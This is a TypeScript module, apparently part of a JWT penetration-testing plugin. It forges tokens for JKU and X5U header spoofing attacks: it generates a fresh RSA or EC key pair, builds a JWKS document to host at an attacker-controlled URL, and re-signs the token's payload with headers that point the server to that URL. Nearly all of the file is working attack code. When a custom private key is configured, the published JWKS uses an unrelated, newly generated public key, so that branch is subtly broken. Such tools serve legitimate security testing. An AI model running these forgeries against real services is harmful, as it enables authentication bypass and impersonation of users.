/**
 * JKU / X5U Spoofing Attacks
 *
 * jku (JSON Web Key Set URL): Attacker sets the jku header to a URL they control
 *   hosting a JWKS containing their own public key, then re-signs with the
 *   corresponding private key.
 *
 * x5u (X.509 URL): Same idea via the x5u header pointing to a certificate.
 *
 * Requires the user to configure a jwksUrl in plugin settings and host the
 * provided JWKS file at that URL.
 */

import { signRSA, signECDSA } from "../crypto/jwt.js";
import { generateRSAKeyPair, buildJWKSDocument } from "../crypto/rsa.js";
import { generateECKeyPair, buildECJWKS } from "../crypto/ecdsa.js";
import type { ParsedJWT, AttackResult, PluginConfig } from "../types.js";
import { nanoid } from "../util.js";

export function buildJKUSpoofAttacks(
  parsed: ParsedJWT,
  config: PluginConfig
): { attacks: AttackResult[]; jwksContent: string | null; jwksKey: string | null } {
  const alg = parsed.header.alg as string;
  const results: AttackResult[] = [];
  let jwksContent: string | null = null;
  let jwksKey: string | null = null;

  if (!config.jwksUrl) {
    return { attacks: [], jwksContent: null, jwksKey: null };
  }

  // Determine algorithm
  const targetAlg = alg.startsWith("ES") ? alg : "RS256";
  const kid = "jwt-attacker-spoof-key";

  let publicJwk: Record<string, unknown>;
  let privateKeyPem: string;
  let jwks: object;

  if (targetAlg.startsWith("ES")) {
    const ecAlg = targetAlg as "ES256" | "ES384" | "ES512";
    if (config.customPrivateKeyPem) {
      privateKeyPem = config.customPrivateKeyPem;
      // Build JWK from configured key — use a placeholder public key for JWKS
      const kp = generateECKeyPair(ecAlg);
      publicJwk = kp.publicJwk as Record<string, unknown>;
    } else {
      const kp = generateECKeyPair(ecAlg);
      publicJwk = kp.publicJwk as Record<string, unknown>;
      privateKeyPem = kp.privateKeyPem;
    }
    jwks = buildECJWKS(publicJwk, ecAlg, kid);
  } else {
    if (config.customPrivateKeyPem) {
      privateKeyPem = config.customPrivateKeyPem;
      const kp = generateRSAKeyPair(2048);
      publicJwk = kp.publicJwk as Record<string, unknown>;
    } else {
      const kp = generateRSAKeyPair(2048);
      publicJwk = kp.publicJwk as Record<string, unknown>;
      privateKeyPem = kp.privateKeyPem;
    }
    jwks = buildJWKSDocument(publicJwk, kid);
  }

  jwksContent = JSON.stringify(jwks, null, 2);
  jwksKey = privateKeyPem;

  // JKU attack
  try {
    const headerJku = {
      ...parsed.header,
      alg: targetAlg,
      jku: config.jwksUrl,
      kid,
      jwk: undefined,
      x5u: undefined,
      x5c: undefined,
    };
    const jwt = targetAlg.startsWith("ES")
      ? signECDSA(headerJku as Parameters<typeof signECDSA>[0], parsed.payload, privateKeyPem, targetAlg as "ES256" | "ES384" | "ES512")
      : signRSA(headerJku as Parameters<typeof signRSA>[0], parsed.payload, privateKeyPem, "RS256");

    results.push({
      id: nanoid(),
      technique: "jkuSpoof",
      techniqueName: `JKU Spoofing (${targetAlg})`,
      description:
        `Sets the jku header to ${config.jwksUrl} and signs with a fresh private key. ` +
        "The server must be able to reach your JWKS endpoint. " +
        "Host the generated JWKS JSON at that URL before sending this request.",
      modifiedJWT: jwt,
      timestamp: Date.now(),
    });
  } catch { /* ignore */ }

  // X5U attack (same key, x5u header instead)
  try {
    const headerX5u = {
      ...parsed.header,
      alg: targetAlg,
      x5u: config.jwksUrl, // same URL — user can host a cert chain there too
      kid,
      jwk: undefined,
      jku: undefined,
      x5c: undefined,
    };
    const jwt = targetAlg.startsWith("ES")
      ? signECDSA(headerX5u as Parameters<typeof signECDSA>[0], parsed.payload, privateKeyPem, targetAlg as "ES256" | "ES384" | "ES512")
      : signRSA(headerX5u as Parameters<typeof signRSA>[0], parsed.payload, privateKeyPem, "RS256");

    results.push({
      id: nanoid(),
      technique: "x5uSpoof",
      techniqueName: `X5U Spoofing (${targetAlg})`,
      description:
        `Sets the x5u header to ${config.jwksUrl} and signs with a fresh private key. ` +
        "Host the generated JWKS / certificate chain at that URL.",
      modifiedJWT: jwt,
      timestamp: Date.now(),
    });
  } catch { /* ignore */ }

  return { attacks: results, jwksContent, jwksKey };
}
